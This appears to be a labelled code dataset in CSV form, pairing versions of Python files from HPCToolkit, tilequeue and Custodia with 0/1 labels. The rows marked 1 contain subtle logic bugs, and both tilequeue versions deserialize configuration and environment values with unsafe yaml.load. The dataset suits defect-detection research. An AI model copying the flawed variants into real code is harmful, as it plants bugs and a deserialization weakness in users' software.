,Unnamed: 0,id,code,label
112,112,6ad16eb9bc401f848c16cb621f5bdd83080cc285,"runner/src/resultdir.py/n/n################################################################################
#                                                                              #
#  output.py                                                                   #
#  preserve files and metrics output by running a job                          #
#                                                                              #                                                                              #
#  $HeadURL$                                                                   #
#  $Id$                                                                        #
#                                                                              #
#  --------------------------------------------------------------------------- #
#  Part of HPCToolkit (hpctoolkit.org)                                         #
#                                                                              #
#  Information about sources of support for research and development of        #
#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #
#  --------------------------------------------------------------------------- #
#                                                                              #
#  Copyright ((c)) 2002-2017, Rice University                                  #
#  All rights reserved.                                                        #
#                                                                              #
#  Redistribution and use in source and binary forms, with or without          #
#  modification, are permitted provided that the following conditions are      #
#  met:                                                                        #
#                                                                              #
#  * Redistributions of source code must retain the above copyright            #
#    notice, this list of conditions and the following disclaimer.             #
#                                                                              #
#  * Redistributions in binary form must reproduce the above copyright         #
#    notice, this list of conditions and the following disclaimer in the       #
#    documentation and/or other materials provided with the distribution.      #
#                                                                              #
#  * Neither the name of Rice University (RICE) nor the names of its           #
#    contributors may be used to endorse or promote products derived from      #
#    this software without specific prior written permission.                  #
#                                                                              #
#  This software is provided by RICE and contributors ""as is"" and any          #
#  express or implied warranties, including, but not limited to, the           #
#  implied warranties of merchantability and fitness for a particular          #
#  purpose are disclaimed. In no event shall RICE or contributors be           #
#  liable for any direct, indirect, incidental, special, exemplary, or         #
#  consequential damages (including, but not limited to, procurement of        #
#  substitute goods or services; loss of use, data, or profits; or             #
#  business interruption) however caused and on any theory of liability,       #
#  whether in contract, strict liability, or tort (including negligence        #
#  or otherwise) arising in any way out of the use of this software, even      #
#  if advised of the possibility of such damage.                               #
#                                                                              #
################################################################################


from common import options, debugmsg



class ResultDir():
    
    def __init__(self, parentdir, name):

        from collections import OrderedDict
        from os import makedirs
        from os.path import join

        self.name = name
        self.dir = join(parentdir, ""_"" + self.name)
        makedirs(self.dir)
        self.outdict = OrderedDict()
        self.numOutfiles = 0


    def __contains__(self, key):
        
        return key in self.outdict
        
    
    def getDir(self):

        return self.dir
        
    
    def makePath(self, nameFmt, label=None):

        from os.path import join

        self.numOutfiles += 1
        path = join(self.dir, (""{:02d}-"" + nameFmt).format(self.numOutfiles, label))
        return path


    def add(self, *keysOrValues, **kwargs):
        
        from collections import OrderedDict
        from common import assertmsg, fatalmsg
        
        assertmsg(len(keysOrValues) >= 2, ""Output.add must receive at least 2 arguments"")
        
        # decompose arguments
        keyPath = kwargs.get(""subroot"", []) + list(keysOrValues[:-2])   # last 2 elements of 'keysOrValues' are key & value for final store
        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'
        value   = keysOrValues[-1]

        # perform insertion
        ob = self._findValueForPath(lastKey, *keyPath)
        fmt = kwargs.get(""format"", None)
        ob[lastKey] = value if fmt is None else float(fmt.format(value))


    def get(self, *keyPath):
        
        # assert: can traverse keyPath without needed to add a new collection, so None is ok for keyAfter
        print keyPath
        return self._findValueForPath(None, *keyPath)


    def addSummaryStatus(self, status, msg):
        
        self.add(""summary"", ""status"",     status)
        self.add(""summary"", ""status msg"", msg)
        

    def write(self):

        from os.path import join
        from spackle import writeYamlFile

        writeYamlFile(join(self.dir, ""{}.yaml"".format(self.name)), self.outdict)


    def _isCompatible(self, key, collection):
        
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype, ctype = type(key), type(collection)
        
        if ktype is str:
            return ctype is dict or ctype is OrderedDict
        elif ktype is int:
            return ctype is list
        else:
            fatalmsg(""ResultDir._isCompatible: invalid key type ({})"".format(ktype))
    
    
    def _findValueForPath(self, keyAfter, *keyPath):
    
        ob = self.outdict
        for k, key in enumerate(keyPath):
            if self._isCompatible(key, ob):
                if key not in ob:
                    nextkey = keyPath[k+1] if k+1 < len(keyPath) else keyAfter
                    ob[key] = self._collectionForKey(nextkey)
                ob = ob[key]
            else:
                fatalmsg(""ResultDir: invalid key for current collection in key path"")
        return ob
    
    
    def _collectionForKey(self, key):
    
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype = type(key)
        
        if ktype is str:
            return OrderedDict()
        elif ktype is int:
            return list()
        else:
            fatalmsg(""ResultDir._collectionForKey: invalid key type ({})"".format(ktype))




/n/n/n",0
113,113,6ad16eb9bc401f848c16cb621f5bdd83080cc285,"/runner/src/resultdir.py/n/n################################################################################
#                                                                              #
#  output.py                                                                   #
#  preserve files and metrics output by running a job                          #
#                                                                              #                                                                              #
#  $HeadURL$                                                                   #
#  $Id$                                                                        #
#                                                                              #
#  --------------------------------------------------------------------------- #
#  Part of HPCToolkit (hpctoolkit.org)                                         #
#                                                                              #
#  Information about sources of support for research and development of        #
#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #
#  --------------------------------------------------------------------------- #
#                                                                              #
#  Copyright ((c)) 2002-2017, Rice University                                  #
#  All rights reserved.                                                        #
#                                                                              #
#  Redistribution and use in source and binary forms, with or without          #
#  modification, are permitted provided that the following conditions are      #
#  met:                                                                        #
#                                                                              #
#  * Redistributions of source code must retain the above copyright            #
#    notice, this list of conditions and the following disclaimer.             #
#                                                                              #
#  * Redistributions in binary form must reproduce the above copyright         #
#    notice, this list of conditions and the following disclaimer in the       #
#    documentation and/or other materials provided with the distribution.      #
#                                                                              #
#  * Neither the name of Rice University (RICE) nor the names of its           #
#    contributors may be used to endorse or promote products derived from      #
#    this software without specific prior written permission.                  #
#                                                                              #
#  This software is provided by RICE and contributors ""as is"" and any          #
#  express or implied warranties, including, but not limited to, the           #
#  implied warranties of merchantability and fitness for a particular          #
#  purpose are disclaimed. In no event shall RICE or contributors be           #
#  liable for any direct, indirect, incidental, special, exemplary, or         #
#  consequential damages (including, but not limited to, procurement of        #
#  substitute goods or services; loss of use, data, or profits; or             #
#  business interruption) however caused and on any theory of liability,       #
#  whether in contract, strict liability, or tort (including negligence        #
#  or otherwise) arising in any way out of the use of this software, even      #
#  if advised of the possibility of such damage.                               #
#                                                                              #
################################################################################


from common import options, debugmsg



class ResultDir():
    
    def __init__(self, parentdir, name):

        from collections import OrderedDict
        from os import makedirs
        from os.path import join

        self.name = name
        self.dir = join(parentdir, ""_"" + self.name)
        makedirs(self.dir)
        self.outdict = OrderedDict()
        self.numOutfiles = 0


    def __contains__(self, key):
        
        return key in self.outdict
        
    
    def getDir(self):

        return self.dir
        
    
    def makePath(self, nameFmt, label=None):

        from os.path import join

        self.numOutfiles += 1
        path = join(self.dir, (""{:02d}-"" + nameFmt).format(self.numOutfiles, label))
        return path


    def add(self, *keysOrValues, **kwargs):
        
        from collections import OrderedDict
        from common import assertmsg, fatalmsg
        
        assertmsg(len(keysOrValues) >= 2, ""Output.add must receive at least 2 arguments"")
        
        # decompose arguments
        keyPath = kwargs.get(""subroot"", []) + list(keysOrValues[:-1])   # last element of 'keysOrValues' is the value
        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'
        value   = keysOrValues[-1]

        # perform insertion
        ob = self._findValueForPath(*keyPath)
        fmt = kwargs.get(""format"", None)
        ob[lastKey] = value if fmt is None else float(fmt.format(value))


    def get(self, *keyPath):
        
        return self._findValueForPath(keyPath)


    def addSummaryStatus(self, status, msg):
        
        self.add(""summary"", ""status"",     status)
        self.add(""summary"", ""status msg"", msg)
        

    def write(self):

        from os.path import join
        from spackle import writeYamlFile

        writeYamlFile(join(self.dir, ""{}.yaml"".format(self.name)), self.outdict)


    def _isCompatible(self, key, collection):
        
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype, ctype = type(key), type(collection)
        
        if ktype is str:
            return ctype is dict or ctype is OrderedDict
        elif ktype is int:
            return ctype is list
        else:
            fatalmsg(""ResultDir._isCompatible: invalid key type ({})"".format(ktype))
    
    
    def _findValueForPath(self, *keyPath):
    
        ob = self.outdict
        for k, key in enumerate(keyPath[:-1]):    # last key in 'keyPath' is not traversed, but used to store given 'value'
            if self._isCompatible(key, ob):
                if key not in ob:
                    nextkey = keyPath[k+1]
                    ob[key] = self._collectionForKey(nextkey)
                ob = ob[key]
            else:
                fatalmsg(""ResultDir: invalid key for current collection in key path"")
        return ob
    
    
    def _collectionForKey(self, key):
    
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype = type(key)
        
        if ktype is str:
            return OrderedDict()
        elif ktype is int:
            return list()
        else:
            fatalmsg(""ResultDir._collectionForKey: invalid key type ({})"".format(ktype))




/n/n/n",1
154,154,75f9e819e7e5c2132d29e5236739fae847279b32,"tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer
from tilequeue.tile import metatile_zoom_from_size
from yaml import load
import os


class Configuration(object):
    '''
    Flatten configuration from yaml
    '''

    def __init__(self, yml):
        self.yml = yml

        self.aws_access_key_id = \
            self._cfg('aws credentials aws_access_key_id') or \
            os.environ.get('AWS_ACCESS_KEY_ID')
        self.aws_secret_access_key = \
            self._cfg('aws credentials aws_secret_access_key') or \
            os.environ.get('AWS_SECRET_ACCESS_KEY')

        self.queue_cfg = self.yml['queue']

        self.store_type = self._cfg('store type')
        self.s3_bucket = self._cfg('store name')
        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')
        self.s3_path = self._cfg('store path')
        self.s3_date_prefix = self._cfg('store date-prefix')
        self.s3_delete_retry_interval = \
            self._cfg('store delete-retry-interval')

        seed_cfg = self.yml['tiles']['seed']
        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']
        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']
        self.seed_n_threads = seed_cfg['n-threads']

        seed_metro_cfg = seed_cfg['metro-extract']
        self.seed_metro_extract_url = seed_metro_cfg['url']
        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']
        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']
        self.seed_metro_extract_cities = seed_metro_cfg['cities']

        seed_top_tiles_cfg = seed_cfg['top-tiles']
        self.seed_top_tiles_url = seed_top_tiles_cfg['url']
        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']
        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']

        toi_store_cfg = self.yml['toi-store']
        self.toi_store_type = toi_store_cfg['type']
        if self.toi_store_type == 's3':
            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']
            self.toi_store_s3_key = toi_store_cfg['s3']['key']
        elif self.toi_store_type == 'file':
            self.toi_store_file_name = toi_store_cfg['file']['name']

        self.seed_should_add_to_tiles_of_interest = \
            seed_cfg['should-add-to-tiles-of-interest']

        seed_custom = seed_cfg['custom']
        self.seed_custom_zoom_start = seed_custom['zoom-start']
        self.seed_custom_zoom_until = seed_custom['zoom-until']
        self.seed_custom_bboxes = seed_custom['bboxes']
        if self.seed_custom_bboxes:
            for bbox in self.seed_custom_bboxes:
                assert len(bbox) == 4, (
                    'Seed config: custom bbox {} does not have exactly '
                    'four elements!').format(bbox)
                min_x, min_y, max_x, max_y = bbox
                assert min_x < max_x, \
                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)
                assert min_y < max_y, \
                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)

        self.seed_unique = seed_cfg['unique']

        intersect_cfg = self.yml['tiles']['intersect']
        self.intersect_expired_tiles_location = (
            intersect_cfg['expired-location'])
        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']

        self.logconfig = self._cfg('logging config')
        self.redis_type = self._cfg('redis type')
        self.redis_host = self._cfg('redis host')
        self.redis_port = self._cfg('redis port')
        self.redis_db = self._cfg('redis db')
        self.redis_cache_set_key = self._cfg('redis cache-set-key')

        self.statsd_host = None
        if self.yml.get('statsd'):
            self.statsd_host = self._cfg('statsd host')
            self.statsd_port = self._cfg('statsd port')
            self.statsd_prefix = self._cfg('statsd prefix')

        process_cfg = self.yml['process']
        self.n_simultaneous_query_sets = \
            process_cfg['n-simultaneous-query-sets']
        self.n_simultaneous_s3_storage = \
            process_cfg['n-simultaneous-s3-storage']
        self.log_queue_sizes = process_cfg['log-queue-sizes']
        self.log_queue_sizes_interval_seconds = \
            process_cfg['log-queue-sizes-interval-seconds']
        self.query_cfg = process_cfg['query-config']
        self.template_path = process_cfg['template-path']
        self.reload_templates = process_cfg['reload-templates']
        self.output_formats = process_cfg['formats']
        self.buffer_cfg = process_cfg['buffer']
        self.process_yaml_cfg = process_cfg['yaml']

        self.postgresql_conn_info = self.yml['postgresql']
        dbnames = self.postgresql_conn_info.get('dbnames')
        assert dbnames is not None, 'Missing postgresql dbnames'
        assert isinstance(dbnames, (tuple, list)), \
            ""Expecting postgresql 'dbnames' to be a list""
        assert len(dbnames) > 0, 'No postgresql dbnames configured'

        self.wof = self.yml.get('wof')

        self.metatile_size = self._cfg('metatile size')
        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)
        self.metatile_start_zoom = self._cfg('metatile start-zoom')

        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')
        assert self.max_zoom_with_changes > self.metatile_zoom
        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom

        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')
        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')
        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')

        self.tile_traffic_log_path = self._cfg(
            'toi-prune tile-traffic-log-path')

        self.group_by_zoom = self.subtree('rawr group-zoom')

    def _cfg(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval[subkey]
        return yamlval

    def subtree(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval.get(subkey)
            if yamlval is None:
                break
        return yamlval


def default_yml_config():
    return {
        'queue': {
            'name': None,
            'type': 'sqs',
            'timeout-seconds': 20
        },
        'store': {
            'type': 's3',
            'name': None,
            'path': 'osm',
            'reduced-redundancy': False,
            'date-prefix': '',
            'delete-retry-interval': 60,
        },
        'aws': {
            'credentials': {
                'aws_access_key_id': None,
                'aws_secret_access_key': None,
            }
        },
        'tiles': {
            'seed': {
                'all': {
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'metro-extract': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                    'cities': None
                },
                'top-tiles': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'custom': {
                    'zoom-start': None,
                    'zoom-until': None,
                    'bboxes': []
                },
                'should-add-to-tiles-of-interest': True,
                'n-threads': 50,
                'unique': True,
            },
            'intersect': {
                'expired-location': None,
                'parent-zoom-until': None,
            },
            'max-zoom-with-changes': 16,
        },
        'toi-store': {
            'type': None,
        },
        'toi-prune': {
            'tile-traffic-log-path': '/tmp/tile-traffic.log',
        },
        'process': {
            'n-simultaneous-query-sets': 0,
            'n-simultaneous-s3-storage': 0,
            'log-queue-sizes': True,
            'log-queue-sizes-interval-seconds': 10,
            'query-config': None,
            'template-path': None,
            'reload-templates': False,
            'formats': ['json'],
            'buffer': {},
            'yaml': {
                'type': None,
                'parse': {
                    'path': '',
                },
                'callable': {
                    'dotted-name': '',
                },
            },
        },
        'logging': {
            'config': None
        },
        'redis': {
            'host': 'localhost',
            'port': 6379,
            'db': 0,
            'cache-set-key': 'tilequeue.tiles-of-interest',
            'type': 'redis_client',
        },
        'postgresql': {
            'host': 'localhost',
            'port': 5432,
            'dbnames': ('osm',),
            'user': 'osm',
            'password': None,
        },
        'metatile': {
            'size': None,
            'start-zoom': 0,
        },
        'queue_buffer_size': {
            'sql': None,
            'proc': None,
            's3': None,
        },
    }


def merge_cfg(dest, source):
    for k, v in source.items():
        if isinstance(v, dict):
            subdest = dest.setdefault(k, {})
            merge_cfg(subdest, v)
        else:
            dest[k] = v
    return dest


def _override_cfg(container, yamlkeys, value):
    """"""
    Override a hierarchical key in the config, setting it to the value.

    Note that yamlkeys should be a non-empty list of strings.
    """"""

    key = yamlkeys[0]
    rest = yamlkeys[1:]

    if len(rest) == 0:
        # no rest means we found the key to update.
        container[key] = value

    elif key in container:
        # still need to find the leaf in the tree, so recurse.
        _override_cfg(container[key], rest, value)

    else:
        # need to create a sub-tree down to the leaf to insert into.
        subtree = {}
        _override_cfg(subtree, rest, value)
        container[key] = subtree


def _make_yaml_key(s):
    """"""
    Turn an environment variable into a yaml key

    Keys in YAML files are generally lower case and use dashes instead of
    underscores. This isn't a universal rule, though, so we'll have to
    either change the keys to conform to this, or have some way of indicating
    this from the environment.
    """"""

    return s.lower().replace(""_"", ""-"")


def make_config_from_argparse(config_file_handle, default_yml=None):
    if default_yml is None:
        default_yml = default_yml_config()

    # override defaults from config file
    yml_data = load(config_file_handle)
    cfg = merge_cfg(default_yml, yml_data)

    # override config file with values from the environment
    for k in os.environ:
        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the
        # _double_ underscores), which will decode the value as YAML and insert
        # it in cfg['foo']['bar'].
        #
        # TODO: should the prefix TILEQUEUE be configurable?
        if k.startswith('TILEQUEUE__'):
            keys = map(_make_yaml_key, k.split('__')[1:])
            value = load(os.environ[k])
            _override_cfg(cfg, keys, value)

    return Configuration(cfg)


def _bounds_pad_no_buf(bounds, meters_per_pixel_dim):
    return dict(
        point=bounds,
        line=bounds,
        polygon=bounds,
    )


def create_query_bounds_pad_fn(buffer_cfg, layer_name):

    if not buffer_cfg:
        return _bounds_pad_no_buf

    buf_by_type = dict(
        point=0,
        line=0,
        polygon=0,
    )

    for format_ext, format_cfg in buffer_cfg.items():
        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)
        format_geometry_cfg = format_cfg.get('geometry', {})
        if format_layer_cfg:
            for geometry_type, buffer_size in format_layer_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)
        if format_geometry_cfg:
            for geometry_type, buffer_size in format_geometry_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)

    if (buf_by_type['point'] ==
            buf_by_type['line'] ==
            buf_by_type['polygon'] == 0):
        return _bounds_pad_no_buf

    def bounds_pad(bounds, meters_per_pixel_dim):
        buffered_by_type = {}
        for geometry_type in ('point', 'line', 'polygon'):
            offset = meters_per_pixel_dim * buf_by_type[geometry_type]
            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)
        return buffered_by_type

    return bounds_pad
/n/n/n",0
155,155,75f9e819e7e5c2132d29e5236739fae847279b32,"/tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer
from tilequeue.tile import metatile_zoom_from_size
from yaml import load
import os


class Configuration(object):
    '''
    Flatten configuration from yaml
    '''

    def __init__(self, yml):
        self.yml = yml

        self.aws_access_key_id = \
            self._cfg('aws credentials aws_access_key_id') or \
            os.environ.get('AWS_ACCESS_KEY_ID')
        self.aws_secret_access_key = \
            self._cfg('aws credentials aws_secret_access_key') or \
            os.environ.get('AWS_SECRET_ACCESS_KEY')

        self.queue_cfg = self.yml['queue']

        self.store_type = self._cfg('store type')
        self.s3_bucket = self._cfg('store name')
        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')
        self.s3_path = self._cfg('store path')
        self.s3_date_prefix = self._cfg('store date-prefix')
        self.s3_delete_retry_interval = \
            self._cfg('store delete-retry-interval')

        seed_cfg = self.yml['tiles']['seed']
        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']
        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']
        self.seed_n_threads = seed_cfg['n-threads']

        seed_metro_cfg = seed_cfg['metro-extract']
        self.seed_metro_extract_url = seed_metro_cfg['url']
        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']
        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']
        self.seed_metro_extract_cities = seed_metro_cfg['cities']

        seed_top_tiles_cfg = seed_cfg['top-tiles']
        self.seed_top_tiles_url = seed_top_tiles_cfg['url']
        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']
        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']

        toi_store_cfg = self.yml['toi-store']
        self.toi_store_type = toi_store_cfg['type']
        if self.toi_store_type == 's3':
            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']
            self.toi_store_s3_key = toi_store_cfg['s3']['key']
        elif self.toi_store_type == 'file':
            self.toi_store_file_name = toi_store_cfg['file']['name']

        self.seed_should_add_to_tiles_of_interest = \
            seed_cfg['should-add-to-tiles-of-interest']

        seed_custom = seed_cfg['custom']
        self.seed_custom_zoom_start = seed_custom['zoom-start']
        self.seed_custom_zoom_until = seed_custom['zoom-until']
        self.seed_custom_bboxes = seed_custom['bboxes']
        if self.seed_custom_bboxes:
            for bbox in self.seed_custom_bboxes:
                assert len(bbox) == 4, (
                    'Seed config: custom bbox {} does not have exactly '
                    'four elements!').format(bbox)
                min_x, min_y, max_x, max_y = bbox
                assert min_x < max_x, \
                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)
                assert min_y < max_y, \
                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)

        self.seed_unique = seed_cfg['unique']

        intersect_cfg = self.yml['tiles']['intersect']
        self.intersect_expired_tiles_location = (
            intersect_cfg['expired-location'])
        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']

        self.logconfig = self._cfg('logging config')
        self.redis_type = self._cfg('redis type')
        self.redis_host = self._cfg('redis host')
        self.redis_port = self._cfg('redis port')
        self.redis_db = self._cfg('redis db')
        self.redis_cache_set_key = self._cfg('redis cache-set-key')

        self.statsd_host = None
        if self.yml.get('statsd'):
            self.statsd_host = self._cfg('statsd host')
            self.statsd_port = self._cfg('statsd port')
            self.statsd_prefix = self._cfg('statsd prefix')

        process_cfg = self.yml['process']
        self.n_simultaneous_query_sets = \
            process_cfg['n-simultaneous-query-sets']
        self.n_simultaneous_s3_storage = \
            process_cfg['n-simultaneous-s3-storage']
        self.log_queue_sizes = process_cfg['log-queue-sizes']
        self.log_queue_sizes_interval_seconds = \
            process_cfg['log-queue-sizes-interval-seconds']
        self.query_cfg = process_cfg['query-config']
        self.template_path = process_cfg['template-path']
        self.reload_templates = process_cfg['reload-templates']
        self.output_formats = process_cfg['formats']
        self.buffer_cfg = process_cfg['buffer']
        self.process_yaml_cfg = process_cfg['yaml']

        self.postgresql_conn_info = self.yml['postgresql']
        dbnames = self.postgresql_conn_info.get('dbnames')
        assert dbnames is not None, 'Missing postgresql dbnames'
        assert isinstance(dbnames, (tuple, list)), \
            ""Expecting postgresql 'dbnames' to be a list""
        assert len(dbnames) > 0, 'No postgresql dbnames configured'

        self.wof = self.yml.get('wof')

        self.metatile_size = self._cfg('metatile size')
        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)
        self.metatile_start_zoom = self._cfg('metatile start-zoom')

        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')
        assert self.max_zoom_with_changes > self.metatile_zoom
        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom

        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')
        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')
        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')

        self.tile_traffic_log_path = self._cfg(
            'toi-prune tile-traffic-log-path')

        self.group_by_zoom = self.subtree('rawr group-zoom')

    def _cfg(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval[subkey]
        return yamlval

    def subtree(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval.get(subkey)
            if yamlval is None:
                break
        return yamlval


def default_yml_config():
    return {
        'queue': {
            'name': None,
            'type': 'sqs',
            'timeout-seconds': 20
        },
        'store': {
            'type': 's3',
            'name': None,
            'path': 'osm',
            'reduced-redundancy': False,
            'date-prefix': '',
            'delete-retry-interval': 60,
        },
        'aws': {
            'credentials': {
                'aws_access_key_id': None,
                'aws_secret_access_key': None,
            }
        },
        'tiles': {
            'seed': {
                'all': {
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'metro-extract': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                    'cities': None
                },
                'top-tiles': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'custom': {
                    'zoom-start': None,
                    'zoom-until': None,
                    'bboxes': []
                },
                'should-add-to-tiles-of-interest': True,
                'n-threads': 50,
                'unique': True,
            },
            'intersect': {
                'expired-location': None,
                'parent-zoom-until': None,
            },
            'max-zoom-with-changes': 16,
        },
        'toi-store': {
            'type': None,
        },
        'toi-prune': {
            'tile-traffic-log-path': '/tmp/tile-traffic.log',
        },
        'process': {
            'n-simultaneous-query-sets': 0,
            'n-simultaneous-s3-storage': 0,
            'log-queue-sizes': True,
            'log-queue-sizes-interval-seconds': 10,
            'query-config': None,
            'template-path': None,
            'reload-templates': False,
            'formats': ['json'],
            'buffer': {},
            'yaml': {
                'type': None,
                'parse': {
                    'path': '',
                },
                'callable': {
                    'dotted-name': '',
                },
            },
        },
        'logging': {
            'config': None
        },
        'redis': {
            'host': 'localhost',
            'port': 6379,
            'db': 0,
            'cache-set-key': 'tilequeue.tiles-of-interest',
            'type': 'redis_client',
        },
        'postgresql': {
            'host': 'localhost',
            'port': 5432,
            'dbnames': ('osm',),
            'user': 'osm',
            'password': None,
        },
        'metatile': {
            'size': None,
            'start-zoom': 0,
        },
        'queue_buffer_size': {
            'sql': None,
            'proc': None,
            's3': None,
        },
    }


def merge_cfg(dest, source):
    for k, v in source.items():
        if isinstance(v, dict):
            subdest = dest.setdefault(k, {})
            merge_cfg(subdest, v)
        else:
            dest[k] = v
    return dest


def _override_cfg(container, yamlkeys, value):
    """"""
    Override a hierarchical key in the config, setting it to the value.

    Note that yamlkeys should be a non-empty list of strings.
    """"""

    key = yamlkeys[0]
    rest = yamlkeys[1:]

    if len(rest) == 0:
        # no rest means we found the key to update.
        container[key] = value

    elif key in container:
        # still need to find the leaf in the tree, so recurse.
        _override_cfg(container, rest, value)

    else:
        # need to create a sub-tree down to the leaf to insert into.
        subtree = {}
        _override_cfg(subtree, rest, value)
        container[key] = subtree


def _make_yaml_key(s):
    """"""
    Turn an environment variable into a yaml key

    Keys in YAML files are generally lower case and use dashes instead of
    underscores. This isn't a universal rule, though, so we'll have to
    either change the keys to conform to this, or have some way of indicating
    this from the environment.
    """"""

    return s.lower().replace(""_"", ""-"")


def make_config_from_argparse(config_file_handle, default_yml=None):
    if default_yml is None:
        default_yml = default_yml_config()

    # override defaults from config file
    yml_data = load(config_file_handle)
    cfg = merge_cfg(default_yml, yml_data)

    # override config file with values from the environment
    for k in os.environ:
        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the
        # _double_ underscores), which will decode the value as YAML and insert
        # it in cfg['foo']['bar'].
        #
        # TODO: should the prefix TILEQUEUE be configurable?
        if k.startswith('TILEQUEUE__'):
            keys = map(_make_yaml_key, k.split('__')[1:])
            value = load(os.environ[k])
            _override_cfg(cfg, keys, value)

    return Configuration(cfg)


def _bounds_pad_no_buf(bounds, meters_per_pixel_dim):
    return dict(
        point=bounds,
        line=bounds,
        polygon=bounds,
    )


def create_query_bounds_pad_fn(buffer_cfg, layer_name):

    if not buffer_cfg:
        return _bounds_pad_no_buf

    buf_by_type = dict(
        point=0,
        line=0,
        polygon=0,
    )

    for format_ext, format_cfg in buffer_cfg.items():
        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)
        format_geometry_cfg = format_cfg.get('geometry', {})
        if format_layer_cfg:
            for geometry_type, buffer_size in format_layer_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)
        if format_geometry_cfg:
            for geometry_type, buffer_size in format_geometry_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)

    if (buf_by_type['point'] ==
            buf_by_type['line'] ==
            buf_by_type['polygon'] == 0):
        return _bounds_pad_no_buf

    def bounds_pad(bounds, meters_per_pixel_dim):
        buffered_by_type = {}
        for geometry_type in ('point', 'line', 'polygon'):
            offset = meters_per_pixel_dim * buf_by_type[geometry_type]
            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)
        return buffered_by_type

    return bounds_pad
/n/n/n",1
100,100,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def _absolute_key(self, key):
        """"""Get absolute path to key and validate key""""""
        if '//' in key:
            raise ValueError(""Invalid empty components in key '%s'"" % key)
        parts = key.split('/')
        if set(parts).intersection({'.', '..'}):
            raise ValueError(""Invalid relative components in key '%s'"" % key)
        return '/'.join([self.namespace] + parts).replace('//', '/')

    def get(self, key):
        try:
            result = self.etcd.get(self._absolute_key(key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = self._absolute_key(key)
        try:
